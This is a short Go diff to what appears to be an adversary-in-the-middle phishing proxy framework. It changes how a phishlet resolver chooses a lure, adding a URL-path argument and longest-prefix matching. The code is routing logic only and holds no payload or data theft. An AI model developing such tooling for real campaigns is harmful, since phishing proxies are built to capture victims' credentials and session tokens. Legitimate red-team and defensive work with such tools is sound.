@@ -2,6 +2,7 @@ package aitm
 
 import (
 	"fmt"
+	"strings"
 	"sync"
 )
 
@@ -32,8 +33,10 @@ func (r *PhishletResolver) RegisterDef(def *PhishletDef) {
 }
 
 // ResolveHostname finds the phishlet definition, config, and best-matching lure
-// for the given hostname. Returns an error if no enabled phishlet claims it.
-func (r *PhishletResolver) ResolveHostname(hostname string) (*PhishletDef, *PhishletConfig, *Lure, error) {
+// for the given hostname and URL path. When multiple lures share a phishlet,
+// the lure whose Path is the longest prefix of urlPath wins. Returns an error
+// if no enabled phishlet claims the hostname.
+func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*PhishletDef, *PhishletConfig, *Lure, error) {
 	configs, err := r.cfgStore.ListPhishletConfigs()
 	if err != nil {
 		return nil, nil, nil, fmt.Errorf("listing phishlet configs: %w", err)
@@ -58,10 +61,16 @@ func (r *PhishletResolver) ResolveHostname(hostname string) (*PhishletDef, *Phis
 			return nil, nil, nil, fmt.Errorf("listing lures: %w", err)
 		}
 		var matched *Lure
+		matchLen := -1
 		for _, lure := range lures {
-			if lure.Phishlet == cfg.Name {
-				matched = lure
-				break
+			if lure.Phishlet != cfg.Name {
+				continue
+			}
+			if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
+				if len(lure.Path) > matchLen {
+					matched = lure
+					matchLen = len(lure.Path)
+				}
 			}
 		}
 		return def, cfg, matched, nil
